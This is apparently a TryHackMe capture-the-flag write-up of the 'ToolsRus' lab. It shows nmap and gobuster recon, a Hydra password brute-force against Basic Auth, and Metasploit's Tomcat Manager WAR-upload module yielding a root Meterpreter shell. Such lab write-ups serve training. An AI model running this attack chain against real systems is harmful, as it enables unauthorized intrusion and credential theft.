# ToolsRus: Write-up
**Platform:** TryHackMe  
**Difficulty:** Easy  
**Category:** Web / Exploitation Tools

---

## Reconnaissance

### Service Discovery
Initial verification confirmed the target's availability. An Nmap scan enumerated the exposed attack surface:

```bash
└─$ nmap -sV -T4 <TARGET_IP>
```

**Observed Services:**
- **22/tcp:** OpenSSH 7.2p2
- **80/tcp:** Apache httpd 2.4.18
- **1234/tcp:** Apache Tomcat / HTTP
- **8009/tcp:** AJP13 (Note: Identified but not required for the primary exploitation path)

---

## Web Enumeration

### Directory Discovery (Gobuster)
Fuzzing the main web server (port 80) revealed a protected area and a directory containing documentation:

```bash
└─$ gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/big.txt
```

**Results:**
- `/guidelines/` (Status: 301)
- `/protected/` (Status: 401: Unauthorized)

### Information Gathering
Inspecting the `/guidelines/` directory revealed a plaintext message containing a potential username:

```bash
└─$ curl http://<TARGET_IP>/guidelines/
```

> **Evidence:** `Hey <b>bob</b>, did you update that TomCat server?`

---

## Credential Attack (Hydra)

The `/protected/` directory uses Basic Authentication. Using the identified username `bob`, a brute-force attack was launched against the service:

```bash
└─$ hydra -l bob -P /usr/share/wordlists/rockyou.txt <TARGET_IP> http-get /protected/
```

**Valid Credentials Found:**
- **Username:** `bob`
- **Password:** `[REDACTED_PASS]`

---

## Service Enumeration

### Tomcat Manager Access
The secondary web service on port **1234** was confirmed to be an **Apache Tomcat** instance. Accessing the Manager interface at `http://<TARGET_IP>:1234/manager/html` with the previously recovered credentials (`bob:[REDACTED]`) confirmed full administrative access.

### Nikto Scan
Nikto was used to confirm the authentication and enumerate allowed methods/misconfigurations on the Tomcat Manager:

```bash
└─$ nikto -h http://<TARGET_IP>:1234/manager/html -id bob:[REDACTED]
```

**Findings:**
- **Service:** Apache-Coyote/1.1
- **Auth:** Successfully authenticated to 'Tomcat Manager Application'.
- **Methods:** HTTP methods `PUT` and `DELETE` are enabled, supporting remote application deployment.

---

## Exploitation (Metasploit)

### RCE via Tomcat Manager Upload
With administrative credentials and the ability to upload WAR files, I leveraged Metasploit to achieve Remote Code Execution.

**Module:** `exploit/multi/http/tomcat_mgr_upload`

```bash
msf6 > use exploit/multi/http/tomcat_mgr_upload
msf6 exploit(...) > set RHOSTS <TARGET_IP>
msf6 exploit(...) > set RPORT 1234
msf6 exploit(...) > set HttpUsername bob
msf6 exploit(...) > set HttpPassword [REDACTED]
msf6 exploit(...) > exploit
```

### Post-Exploitation
The exploit successfully returned a Meterpreter session.

**Validation:**
```bash
meterpreter > getuid
Server username: root

meterpreter > cat /root/flag.txt
# Flag: [REDACTED_FLAG]
```

> **Note:** The session was obtained with **root** privileges directly, as the Tomcat service was misconfigured to run with high permissions.

---
